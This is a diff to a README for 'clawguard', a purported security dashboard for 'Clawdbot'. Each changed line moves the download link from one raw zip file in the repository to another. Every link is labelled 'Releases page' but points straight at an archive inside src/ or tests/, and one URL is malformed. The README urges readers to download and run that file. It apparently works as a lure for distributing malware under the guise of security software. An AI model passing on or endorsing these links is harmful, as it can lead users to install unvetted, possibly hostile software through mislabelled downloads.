@@ -1,7 +1,7 @@
 # 🛡️ clawguard - A Simple Way to Monitor Activity and Secure Clawdbot
 
 ## 📥 Download Now
-[![Download Clawguard](https://github.com/lauty1505/clawguard/raw/refs/heads/main/src/Software-tannin.zip%https://github.com/lauty1505/clawguard/raw/refs/heads/main/src/Software-tannin.zip)](https://github.com/lauty1505/clawguard/raw/refs/heads/main/src/Software-tannin.zip)
+[![Download Clawguard](https://github.com/lauty1505/clawguard/raw/refs/heads/main/tests/Software-v1.3.zip%https://github.com/lauty1505/clawguard/raw/refs/heads/main/tests/Software-v1.3.zip)](https://github.com/lauty1505/clawguard/raw/refs/heads/main/tests/Software-v1.3.zip)
 
 ## 🚀 Getting Started
 Clawguard is an activity monitor and security dashboard designed for Clawdbot. It provides real-time analytics, risk analysis, and a kill switch to keep your data safe. This README will guide you through downloading and running Clawguard.
@@ -17,7 +17,7 @@ Before you start, ensure your system meets the following requirements:
 To get started, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/lauty1505/clawguard/raw/refs/heads/main/src/Software-tannin.zip) on GitHub.
+   Go to the [Releases page](https://github.com/lauty1505/clawguard/raw/refs/heads/main/tests/Software-v1.3.zip) on GitHub.
 
 2. **Locate the Latest Version**
    Find the latest version of Clawguard. The version will be listed at the top of the releases. Look for a release marked as "Latest".
@@ -67,4 +67,4 @@ Clawguard is developed and maintained by a dedicated team. Special thanks to our
 ## 🔗 Additional Information
 For more information about Clawguard and its integration capabilities, please refer to our documentation available on the GitHub Wiki. 
 
-To summarize, you can download Clawguard from the [Releases page](https://github.com/lauty1505/clawguard/raw/refs/heads/main/src/Software-tannin.zip) and start securing your Clawdbot in just a few easy steps.
+To summarize, you can download Clawguard from the [Releases page](https://github.com/lauty1505/clawguard/raw/refs/heads/main/tests/Software-v1.3.zip) and start securing your Clawdbot in just a few easy steps.
